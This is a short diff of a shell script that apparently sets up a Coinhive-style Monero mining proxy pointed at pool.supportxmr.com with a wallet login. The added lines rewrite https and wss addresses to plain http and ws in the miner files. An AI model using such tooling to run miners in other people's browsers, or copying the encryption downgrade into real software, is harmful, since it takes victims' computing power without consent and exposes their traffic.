@@ -67,6 +67,8 @@ if [ "$proxyYes" == "y" ]; then
       echo "proxy.listen({server: server});" >> proxy.js
       echo "node proxy.js" > proxy.sh
     else
+      sed -i 's/https:/http:/g' $coinhive
+      sed -i 's/wss:/ws:/g' $minerblock
       echo "coin-hive-stratum "$port" --host=pool.supportxmr.com --port=3333 --login="$walletId > proxy.sh
     fi
     clear
